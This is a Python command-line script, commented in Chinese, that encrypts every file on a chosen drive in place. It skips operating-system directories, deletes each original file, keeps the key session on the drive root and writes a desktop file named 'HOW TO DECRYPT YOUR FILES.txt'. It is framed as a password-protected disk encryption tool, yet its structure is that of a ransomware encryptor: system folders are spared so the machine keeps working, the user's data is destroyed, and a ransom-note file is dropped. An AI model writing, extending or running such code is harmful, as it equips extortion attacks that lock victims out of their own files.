#!/usr/bin/env python3
"""
vault-encrypt — 原地加密整个磁盘（跳过系统目录）。
每个文件被加密为同路径的 .vault 文件，原始文件随即删除。
密钥文件 .vault_session 保存在盘符根目录。

用法: python encrypt.py [--drive C] [--workers 4]
"""

import sys
import getpass
import platform
from pathlib import Path

import click

from crypto import create_session
from walker import encrypt_inplace

# ─── 系统目录跳过名单 ──────────────────────────────────────────────────────────

_WIN_SKIP_DIRS: set[str] = {
    "windows", "windows.old", "windows.~bt", "windows.~ws",
    "$windows.~bt", "$windows.~ws", "$winreagent",
    "$recycle.bin", "system volume information",
    "recovery", "msocache", "perflogs", "boot",
}

_WIN_SKIP_ROOT_FILES: set[str] = {
    "pagefile.sys", "hiberfil.sys", "swapfile.sys",
    "bootmgr", "bootmgr.efi", "bootnxt", "bootsect.bak",
    "boot.ini", "ntldr", "ntdetect.com",
}

_UNIX_SKIP_DIRS: set[str] = {
    "proc", "sys", "dev", "run", "tmp", "boot", "lost+found", "snap",
}


def _build_skip(root: Path):
    is_win    = platform.system() == "Windows"
    skip_dirs = _WIN_SKIP_DIRS  if is_win else _UNIX_SKIP_DIRS
    skip_files = _WIN_SKIP_ROOT_FILES if is_win else set()

    def should_skip(path: Path) -> bool:
        try:
            rel = path.relative_to(root)
        except ValueError:
            return False
        parts = rel.parts
        if not parts:
            return False
        top = parts[0].lower()
        if top in skip_dirs:
            return True
        if len(parts) == 1 and not path.is_dir() and top in skip_files:
            return True
        return False

    return should_skip


def _get_password() -> str:
    pwd = getpass.getpass("设置加密密码: ")
    if not pwd:
        click.echo("错误：密码不能为空。", err=True)
        sys.exit(1)
    if getpass.getpass("再次确认密码: ") != pwd:
        click.echo("错误：两次密码不一致。", err=True)
        sys.exit(1)
    return pwd


def _error_cb(path: Path, exc: Exception) -> None:
    click.echo(f"  [跳过] {path.name}: {exc}", err=True)


def _resolve_root(drive: str) -> Path:
    if platform.system() == "Windows":
        letter = drive.rstrip(":\\/").upper()
        return Path(letter + ":\\")
    return Path(drive)


# ─── CLI ───────────────────────────────────────────────────────────────────────

@click.command()
@click.option("--drive", default="C", show_default=True,
              help="Windows 盘符（C / D / …）；Linux 填挂载路径（如 /home）。")
@click.option("--workers", "-w", default=4, show_default=True,
              help="并行线程数，SSD 可调到 8。")
@click.option("--password", "-p", default=None,
              help="密码（建议省略，改为交互式输入）。")
@click.option("--show-skipped", is_flag=True, default=False,
              help="预览跳过/加密的顶层目录，不执行加密。")
def main(drive: str, workers: int, password: str | None, show_skipped: bool) -> None:
    """
    原地加密整个磁盘，跳过系统目录。

    \b
    加密规则：
      原始文件  →  原始文件.vault（原始文件立即删除）
      .vault_session 保存在盘符根目录，解密时需要。

    \b
    示例
    ----
      python encrypt.py
      python encrypt.py --drive D
      python encrypt.py --workers 8
      python encrypt.py --show-skipped
    """
    root = _resolve_root(drive)
    if not root.exists():
        click.echo(f"错误：找不到 {root}", err=True)
        sys.exit(1)

    skip = _build_skip(root)

    if show_skipped:
        click.echo(f"扫描根目录: {root}\n")
        click.echo("将被跳过（系统目录）：")
        for d in sorted(root.iterdir()):
            if d.is_dir() and skip(d):
                click.echo(f"  [跳过] {d}")
        click.echo("\n将被加密：")
        for d in sorted(root.iterdir()):
            if d.is_dir() and not skip(d):
                click.echo(f"  [加密] {d}")
        return

    if password is None:
        password = _get_password()

    click.echo("正在生成密钥（Argon2id，约 1-2 秒）…")
    master = create_session(password, root)        # .vault_session → root

    click.echo(f"扫描根目录: {root}")
    click.echo(f"线程数    : {workers}")
    click.echo()

    ok, err = encrypt_inplace(root, master, workers, _error_cb, skip)

    # 加密完成后在桌面生成空白提示文件（内容由用户自行填写）
    _drop_desktop_note()

    click.echo()
    click.echo(f"完成。已加密: {ok}  错误: {err}")
    if err:
        sys.exit(2)


def _drop_desktop_note() -> None:
    """在当前用户桌面创建空白 txt，用户可自行填写解密说明。"""
    desktop = Path.home() / "Desktop"
    if not desktop.exists():
        # 兼容部分 Windows 系统桌面路径差异
        desktop = Path.home() / "OneDrive" / "Desktop"
    if not desktop.exists():
        return
    note = desktop / "HOW TO DECRYPT YOUR FILES.txt"
    if not note.exists():
        note.write_text("", encoding="utf-8")


if __name__ == "__main__":
    main()
